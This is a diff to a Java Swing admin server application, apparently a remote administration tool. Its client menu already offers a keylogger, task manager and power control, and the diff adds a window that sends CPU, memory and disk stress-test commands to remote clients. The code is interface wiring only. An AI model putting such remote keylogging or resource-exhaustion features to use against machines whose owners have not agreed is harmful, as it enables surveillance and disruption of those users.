@@ -144,7 +144,7 @@ public class AdminServerApp extends JFrame {
         //sidebar.add(createMenuButton("Task Manager", "task.png", false));
         //sidebar.add(createMenuButton("File Explorer", "file.png", false));
         //sidebar.add(createMenuButton("System Power", "power.png", false));
-        sidebar.add(createMenuButton("Stress Test", "stress.png", false));
+        //sidebar.add(createMenuButton("Stress Test", "stress.png", false));
 
         sidebar.add(Box.createVerticalGlue());
 
@@ -1019,6 +1019,11 @@ public class AdminServerApp extends JFrame {
              }
         });
     }
+    public void updateStressTestData(String clientName, String data) {
+    SwingUtilities.invokeLater(() -> {
+        addLog("[STRESS] " + clientName + ": " + data);
+    });
+}
     private void openClientActionDialog(String clientName) {
         JDialog dialog = new JDialog(this, "Client Actions - " + clientName, false);
         dialog.setSize(420, 420);
@@ -1046,6 +1051,7 @@ public class AdminServerApp extends JFrame {
         JButton keyloggerBtn = createDarkButton("Keylogger");
         JButton taskBtn = createDarkButton("Task Manager");
         JButton powerBtn = createDarkButton("System Power");
+        JButton stressBtn = createDarkButton("Stress Test");
         JButton closeBtn = createDarkButton("Close");
 
         screenBtn.addActionListener(e -> {
@@ -1090,6 +1096,13 @@ public class AdminServerApp extends JFrame {
             addLog("[POWER] Open power control for " + clientName);
             openPowerControlDialog(clientName);
         });
+
+        stressBtn.addActionListener(e -> {
+            addLog("[STRESS] Open stress test for " + clientName);
+            openStressTestWindow(clientName);
+        });
+
+        actionPanel.add(stressBtn);
 
 
         closeBtn.addActionListener(e -> dialog.dispose());
@@ -1280,4 +1293,100 @@ public class AdminServerApp extends JFrame {
         dialog.add(panel, BorderLayout.CENTER);
         dialog.setVisible(true);
     }
+
+    private void openStressTestWindow(String clientName) {
+    JFrame frame = new JFrame("Stress Test - " + clientName);
+    frame.setSize(450, 400);
+    frame.setLocationRelativeTo(this);
+    frame.setLayout(new BorderLayout());
+    frame.getContentPane().setBackground(BG);
+
+    JLabel title = new JLabel("  STRESS TEST - " + clientName);
+    title.setForeground(TEXT);
+    title.setFont(new Font("Segoe UI", Font.BOLD, 18));
+    title.setOpaque(true);
+    title.setBackground(BG);
+    title.setBorder(BorderFactory.createCompoundBorder(
+            BorderFactory.createMatteBorder(1, 1, 1, 1, RED),
+            BorderFactory.createEmptyBorder(12, 14, 12, 14)
+    ));
+
+    JPanel panel = new JPanel(new GridLayout(3, 2, 15, 15));
+    panel.setBackground(BG);
+    panel.setBorder(BorderFactory.createEmptyBorder(20, 20, 20, 20));
+
+    // CPU Test
+    JLabel cpuLabel = new JLabel("CPU (%):");
+    cpuLabel.setForeground(TEXT);
+    JSlider cpuSlider = new JSlider(0, 100, 50);
+    cpuSlider.setBackground(BG);
+    cpuSlider.setForeground(RED);
+    
+    JButton cpuBtn = createRedButton("Start CPU");
+    cpuBtn.addActionListener(e -> {
+        int value = cpuSlider.getValue();
+        controller.sendCommandToClient(clientName, "START_STRESS_TEST|CPU|" + value);
+        addLog("[STRESS] CPU test started for " + clientName + " - " + value + "%");
+    });
+
+    // Memory Test
+    JLabel memLabel = new JLabel("Memory (%):");
+    memLabel.setForeground(TEXT);
+    JSlider memSlider = new JSlider(10, 90, 50);
+    memSlider.setBackground(BG);
+    memSlider.setForeground(RED);
+    
+    JButton memBtn = createRedButton("Start Memory");
+    memBtn.addActionListener(e -> {
+        int value = memSlider.getValue();
+        controller.sendCommandToClient(clientName, "START_STRESS_TEST|MEMORY|" + value);
+        addLog("[STRESS] Memory test started for " + clientName + " - " + value + "%");
+    });
+
+    // Disk Test
+    JLabel diskLabel = new JLabel("Disk (seconds):");
+    diskLabel.setForeground(TEXT);
+    JSlider diskSlider = new JSlider(10, 120, 60);
+    diskSlider.setBackground(BG);
+    diskSlider.setForeground(RED);
+    
+    JButton diskBtn = createRedButton("Start Disk");
+    diskBtn.addActionListener(e -> {
+        int value = diskSlider.getValue();
+        controller.sendCommandToClient(clientName, "START_STRESS_TEST|DISK|" + value);
+        addLog("[STRESS] Disk test started for " + clientName + " - " + value + "s");
+    });
+
+    panel.add(cpuLabel);
+    panel.add(cpuSlider);
+    panel.add(cpuBtn);
+    panel.add(memLabel);
+    panel.add(memSlider);
+    panel.add(memBtn);
+
+    JButton stopBtn = createDarkButton("Stop Test");
+    stopBtn.setForeground(RED);
+    stopBtn.addActionListener(e -> {
+        controller.sendCommandToClient(clientName, "STOP_STRESS_TEST");
+        addLog("[STRESS] Test stopped for " + clientName);
+    });
+
+    JPanel diskPanel = new JPanel(new BorderLayout());
+    diskPanel.setBackground(BG);
+    diskPanel.add(diskLabel, BorderLayout.WEST);
+    diskPanel.add(diskSlider, BorderLayout.CENTER);
+
+    JPanel btnPanel = new JPanel(new FlowLayout(FlowLayout.CENTER, 10, 10));
+    btnPanel.setBackground(BG);
+    btnPanel.add(cpuBtn);
+    btnPanel.add(memBtn);
+    btnPanel.add(diskBtn);
+    btnPanel.add(stopBtn);
+
+    frame.add(title, BorderLayout.NORTH);
+    frame.add(panel, BorderLayout.CENTER);
+    frame.add(btnPanel, BorderLayout.SOUTH);
+    frame.setVisible(true);
+}
+
 }
